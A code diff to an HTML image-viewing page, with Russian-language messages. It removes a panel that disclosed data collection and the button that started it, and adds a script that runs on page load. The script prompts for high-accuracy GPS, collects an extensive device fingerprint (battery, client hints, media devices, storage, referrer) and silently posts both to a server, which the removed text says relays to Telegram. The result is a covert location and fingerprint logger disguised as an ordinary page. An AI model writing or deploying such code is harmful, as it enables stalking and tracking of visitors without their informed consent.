@@ -10,12 +10,12 @@
       margin: 0;
       min-height: 100vh;
       background: #1a1a1a;
-      color: #e8e8e8;
+      color: #b0b0b0;
       font-family: system-ui, sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding: 1rem 1rem 2rem;
+      padding: 0.75rem 0.75rem 1.25rem;
     }
     figure {
       margin: 0;
@@ -28,37 +28,13 @@
       height: auto;
       border-radius: 8px;
     }
-    .panel {
-      max-width: min(100%, 520px);
-      margin-top: 1.25rem;
-      padding: 1rem;
-      background: #2a2a2a;
-      border-radius: 8px;
-      font-size: 0.875rem;
-      line-height: 1.5;
-    }
-    .panel p { margin: 0 0 0.75rem; }
-    .panel p:last-child { margin-bottom: 0; }
-    button {
-      margin-top: 0.75rem;
-      width: 100%;
-      padding: 0.75rem 1rem;
-      font-size: 1rem;
-      font-weight: 600;
-      border: none;
-      border-radius: 8px;
-      background: #0d7dd6;
-      color: #fff;
-      cursor: pointer;
-    }
-    button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
     #status {
-      margin-top: 0.75rem;
-      font-size: 0.8rem;
-      color: #aaa;
+      max-width: min(100%, 520px);
+      margin-top: 0.65rem;
+      font-size: 0.78rem;
+      line-height: 1.45;
+      text-align: center;
+      color: #888;
       white-space: pre-wrap;
     }
     .err { color: #f66; }
@@ -75,50 +51,74 @@
       decoding="async"
     />
   </figure>
-
-  <div class="panel">
-    <p>
-      Чтобы получить координаты с модуля GPS (как в навигаторе), браузер покажет
-      системный запрос разрешения — без него точное место недоступно.
-    </p>
-    <p>
-      После согласия страница отправит на сервер координаты и доступные сведения
-      об устройстве; сервер пришлёт их в Telegram. Токен бота в странице не хранится.
-    </p>
-    <button type="button" id="send">Разрешить геолокацию и отправить данные</button>
-    <div id="status"></div>
-  </div>
+  <div id="status" aria-live="polite"></div>
 
   <script>
     (function () {
-      const btn = document.getElementById("send");
-      const status = document.getElementById("status");
+      const statusEl = document.getElementById("status");
+      let started = false;
 
-      (function hintGeoPermission() {
-        try {
-          if (!navigator.permissions || !navigator.permissions.query) return;
-          navigator.permissions.query({ name: "geolocation" }).then((st) => {
-            if (st.state === "denied") {
-              status.innerHTML =
-                '<span class="err">Геолокация для этого сайта отключена в настройках браузера. Включите доступ (значок замка или «i» в адресной строке → разрешения), обновите страницу.</span>';
-            }
-          });
-        } catch (_) {}
-      })();
+      function escapeHtml(s) {
+        const d = document.createElement("div");
+        d.textContent = s;
+        return d.innerHTML;
+      }
 
-      function collectEnv() {
+      function formatGeolocationError(err) {
+        if (!err) return "Неизвестная ошибка геолокации";
+        const code = err.code;
+        if (code === 1) {
+          return (
+            "Доступ к геолокации запрещён. Откройте настройки сайта (замок / «i» в адресной строке) → разрешите «Местоположение», " +
+            "при необходимости включите GPS в настройках телефона и обновите страницу."
+          );
+        }
+        if (code === 2) {
+          return (
+            "Местоположение недоступно. На смартфоне включите «Службы геолокации» / GPS и режим «Высокая точность», " +
+            "выйдите на улицу или к окну и обновите страницу."
+          );
+        }
+        if (code === 3) {
+          return "Таймаут ожидания координат. Повторите после лучшего приёма GPS.";
+        }
+        const m = err.message || "";
+        if (/denied/i.test(m)) return formatGeolocationError({ code: 1 });
+        return m || "Ошибка геолокации";
+      }
+
+      async function collectFullEnv() {
         const nav = navigator;
-        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
         const out = {
           userAgent: nav.userAgent,
           language: nav.language,
           languages: nav.languages ? Array.from(nav.languages) : [],
           platform: nav.platform,
+          vendor: nav.vendor || "",
+          product: nav.product || "",
+          vendorSub: nav.vendorSub || "",
+          productSub: nav.productSub || "",
           hardwareConcurrency: nav.hardwareConcurrency,
           deviceMemory: nav.deviceMemory,
           maxTouchPoints: nav.maxTouchPoints,
           cookieEnabled: nav.cookieEnabled,
+          onLine: nav.onLine,
+          webdriver: nav.webdriver,
+          pdfViewerEnabled: nav.pdfViewerEnabled,
+          doNotTrack: nav.doNotTrack,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffsetMin: -new Date().getTimezoneOffset(),
+          visibilityState: document.visibilityState,
+          referrer: document.referrer || "",
+          pageUrl: location.href,
+          locationBar: {
+            protocol: location.protocol,
+            host: location.host,
+            hostname: location.hostname,
+            pathname: location.pathname,
+            search: location.search,
+            hash: location.hash,
+          },
           screen: {
             width: screen.width,
             height: screen.height,
@@ -127,56 +127,116 @@
             pixelDepth: screen.pixelDepth,
             orientation: screen.orientation ? screen.orientation.type : null,
           },
+          screenColorDepth: screen.colorDepth,
           viewport: {
             innerWidth: window.innerWidth,
             innerHeight: window.innerHeight,
             devicePixelRatio: window.devicePixelRatio,
           },
-          referrer: document.referrer || "",
-          pageUrl: location.href,
+          windowOuter: {
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+          },
         };
+
+        try {
+          out.intl = Intl.DateTimeFormat().resolvedOptions();
+        } catch (_) {
+          out.intl = null;
+        }
+
+        try {
+          out.prefersColorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches
+            ? "dark"
+            : "light";
+        } catch (_) {}
+        try {
+          out.prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+        } catch (_) {}
+
+        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
         if (conn) {
           out.network = {
+            type: conn.type,
             effectiveType: conn.effectiveType,
             downlink: conn.downlink,
             rtt: conn.rtt,
             saveData: conn.saveData,
           };
         }
+
+        if (performance.memory) {
+          out.performanceMemory = {
+            usedJSHeapSize: performance.memory.usedJSHeapSize,
+            totalJSHeapSize: performance.memory.totalJSHeapSize,
+            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+          };
+        }
+
+        try {
+          if (nav.getBattery) {
+            const b = await nav.getBattery();
+            out.battery = {
+              level: b.level,
+              charging: b.charging,
+              chargingTime: b.chargingTime,
+              dischargingTime: b.dischargingTime,
+            };
+          }
+        } catch (_) {}
+
+        try {
+          if (nav.storage && nav.storage.estimate) {
+            const est = await nav.storage.estimate();
+            out.storage = { quota: est.quota, usage: est.usage };
+          }
+        } catch (_) {}
+
+        try {
+          if (nav.userAgentData && nav.userAgentData.getHighEntropyValues) {
+            out.uaClientHints = await nav.userAgentData.getHighEntropyValues([
+              "architecture",
+              "bitness",
+              "brands",
+              "fullVersionList",
+              "mobile",
+              "model",
+              "platform",
+              "platformVersion",
+              "uaFullVersion",
+              "wow64",
+            ]);
+          }
+        } catch (_) {}
+
+        try {
+          if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
+            const devs = await nav.mediaDevices.enumerateDevices();
+            const byKind = {};
+            devs.forEach(function (d) {
+              byKind[d.kind] = (byKind[d.kind] || 0) + 1;
+            });
+            out.mediaDevices = {
+              total: devs.length,
+              byKind: byKind,
+              hasLabels: devs.some(function (d) {
+                return d.label && d.label.length > 0;
+              }),
+            };
+          }
+        } catch (_) {}
+
         return out;
       }
 
-      function formatGeolocationError(err) {
-        if (!err) return "Неизвестная ошибка геолокации";
-        const code = err.code;
-        if (code === 1) {
-          return (
-            "Доступ к геолокации запрещён. Если вы нажали «Блокировать», откройте настройки сайта " +
-            "(значок замка или «i» слева от адреса) → Разрешения / Доступ к местоположению → Разрешить, " +
-            "обновите страницу и нажмите кнопку снова."
-          );
-        }
-        if (code === 2) {
-          return "Местоположение временно недоступно (слабый GPS или сеть). Попробуйте у окна/на улице.";
-        }
-        if (code === 3) {
-          return "Не успели получить координаты за отведённое время. Повторите попытку.";
-        }
-        const m = err.message || "";
-        if (/denied/i.test(m)) {
-          return formatGeolocationError({ code: 1 });
-        }
-        return m || "Ошибка геолокации";
-      }
-
       function readGeo() {
-        return new Promise((resolve, reject) => {
+        return new Promise(function (resolve, reject) {
           if (!navigator.geolocation) {
             reject(new Error("Геолокация в этом браузере не поддерживается"));
             return;
           }
           navigator.geolocation.getCurrentPosition(
-            (pos) => {
+            function (pos) {
               const c = pos.coords;
               resolve({
                 latitude: c.latitude,
@@ -189,36 +249,70 @@
                 timestamp: pos.timestamp,
               });
             },
-            (err) => reject(new Error(formatGeolocationError(err))),
+            function (err) {
+              reject(new Error(formatGeolocationError(err)));
+            },
             {
               enableHighAccuracy: true,
               maximumAge: 0,
-              timeout: 25000,
+              timeout: 28000,
             }
           );
         });
       }
 
-      btn.addEventListener("click", async () => {
-        status.textContent = "";
-        btn.disabled = true;
-        status.textContent = "Ждём разрешение и фиксацию GPS…";
+      async function startAutoReport() {
+        if (started) return;
+        started = true;
+
+        try {
+          if (navigator.permissions && navigator.permissions.query) {
+            const st = await navigator.permissions.query({ name: "geolocation" });
+            if (st.state === "denied") {
+              statusEl.innerHTML =
+                '<span class="err">Геолокация для этого сайта отключена в браузере. Включите её в настройках адреса (замок) и обновите страницу.</span>';
+              started = false;
+              return;
+            }
+          }
+        } catch (_) {}
+
+        statusEl.textContent =
+          "Сейчас появится запрос доступа к местоположению. Разрешите его; на телефоне при необходимости включите GPS (высокая точность).";
+
+        try {
+          if (/Android|iPhone|iPad|Mobile/i.test(navigator.userAgent)) {
+            navigator.vibrate && navigator.vibrate(40);
+          }
+        } catch (_) {}
+
+        let env;
+        try {
+          env = await collectFullEnv();
+        } catch (e) {
+          env = {
+            userAgent: navigator.userAgent,
+            pageUrl: location.href,
+            collectEnvError: String(e && e.message ? e.message : e),
+          };
+        }
+
+        statusEl.textContent = "Запрос координат GPS / сети… Подтвердите в системном окне.";
 
         let geo;
         try {
           geo = await readGeo();
         } catch (e) {
-          status.innerHTML =
-            '<span class="err">' +
-            (e && e.message ? e.message : String(e)) +
-            "</span>";
-          btn.disabled = false;
+          statusEl.innerHTML = '<span class="err">' + escapeHtml(e.message) + "</span>";
+          started = false;
           return;
         }
 
+        statusEl.textContent = "Отправка отчёта…";
+
         const payload = {
           collectedAt: new Date().toISOString(),
-          env: collectEnv(),
+          env: env,
           geolocation: geo,
         };
 
@@ -229,19 +323,18 @@
             body: JSON.stringify(payload),
           });
           const text = await r.text();
-          if (!r.ok) {
-            throw new Error(text || "HTTP " + r.status);
-          }
-          status.innerHTML =
-            '<span class="ok">Отправлено в Telegram.</span>\n' + text;
+          if (!r.ok) throw new Error(text || "HTTP " + r.status);
+          statusEl.innerHTML = '<span class="ok">Готово.</span>';
         } catch (e) {
-          status.innerHTML =
-            '<span class="err">' +
-            (e && e.message ? e.message : String(e)) +
-            "</span>";
-        } finally {
-          btn.disabled = false;
+          statusEl.innerHTML =
+            '<span class="err">' + escapeHtml(e && e.message ? e.message : String(e)) + "</span>";
         }
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        requestAnimationFrame(function () {
+          startAutoReport();
+        });
       });
     })();
   </script>
